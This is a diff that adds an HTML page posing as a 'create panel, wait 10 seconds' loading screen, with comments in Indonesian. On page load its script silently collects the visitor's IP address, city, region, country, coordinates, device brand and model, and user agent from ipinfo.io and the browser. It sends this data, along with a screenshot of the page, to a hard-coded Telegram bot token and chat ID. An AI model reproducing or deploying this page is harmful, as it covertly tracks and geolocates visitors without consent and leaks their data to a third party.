@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HALO BANG</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+  <h2>CREATE PANEL TUNGGU 10 DETIK</h2>
+  <p>PROSES BG.</p>
+
+  <script>
+    const token = '7885992102:AAFkTsC_lli6AqhRaHI5_poOcrpoFDAY_Qo'; // Telegram Bot Token
+    const chat_id = '7885361809'; // Chat ID
+
+    // Fungsi untuk mendapatkan merek HP berdasarkan User-Agent
+    function getDeviceBrand() {
+      let ua = navigator.userAgent;
+      if (ua.includes("Samsung")) return "Samsung";
+      if (ua.includes("Xiaomi")) return "Xiaomi";
+      if (ua.includes("OPPO")) return "OPPO";
+      if (ua.includes("Vivo")) return "Vivo";
+      if (ua.includes("Realme")) return "Realme";
+      if (ua.includes("iPhone")) return "Apple iPhone";
+      if (ua.includes("Huawei")) return "Huawei";
+      return "Unknown Device";
+    }
+
+    // Fungsi untuk mendapatkan model perangkat (hanya Chrome terbaru)
+    async function getDeviceModel() {
+      if (navigator.userAgentData) {
+        let data = await navigator.userAgentData.getHighEntropyValues(["model"]);
+        return data.model || "Unknown Model";
+      }
+      return "Unknown Model";
+    }
+
+    // Fungsi untuk mengirim informasi ke Telegram
+    async function sendInfoToTelegram(info) {
+      let deviceBrand = getDeviceBrand();
+      let deviceModel = await getDeviceModel();
+      let message = `📌 User Info Detected:\n\n📍IP: ${info.ip}\n🏙 City: ${info.city}\n📍Region: ${info.region}\n🌍 Country: ${info.country}\n📌 Location: ${info.loc}\n📱 Device: ${deviceBrand} - ${deviceModel}\n🌐 Browser: ${navigator.userAgent}`;
+
+      $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage`,
+        method: "POST",
+        data: { chat_id: chat_id, text: message },
+        success: function() { console.log('Info sent to Telegram'); },
+        error: function(error) { console.error('Error sending info', error); }
+      });
+
+      captureScreenshot(); // Ambil screenshot setelah kirim info
+    }
+
+    // Fungsi untuk menangkap screenshot & mengirim ke Telegram
+    function captureScreenshot() {
+      html2canvas(document.body).then(canvas => {
+        let image = canvas.toDataURL("image/png");
+        let formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", dataURItoBlob(image), "screenshot.png");
+
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).then(() => console.log("Screenshot sent"))
+          .catch(error => console.error("Error sending screenshot", error));
+      });
+    }
+
+    // Fungsi untuk konversi DataURI ke Blob
+    function dataURItoBlob(dataURI) {
+      let byteString = atob(dataURI.split(',')[1]);
+      let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      let ab = new ArrayBuffer(byteString.length);
+      let ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+      return new Blob([ab], { type: mimeString });
+    }
+
+    // Ambil IP & lokasi pengguna
+    function getIPLocation() {
+      $.get("https://ipinfo.io", function(response) {
+        sendInfoToTelegram(response); // Kirim info & lokasi ke Telegram
+      }, "json").fail(function() {
+        alert("Error retrieving IP information.");
+      });
+    }
+
+    // Load library untuk screenshot, lalu jalankan fungsi lokasi
+    let script = document.createElement('script');
+    script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js";
+    script.onload = getIPLocation;
+    document.body.appendChild(script);
+  </script>
+</body>
+</html>
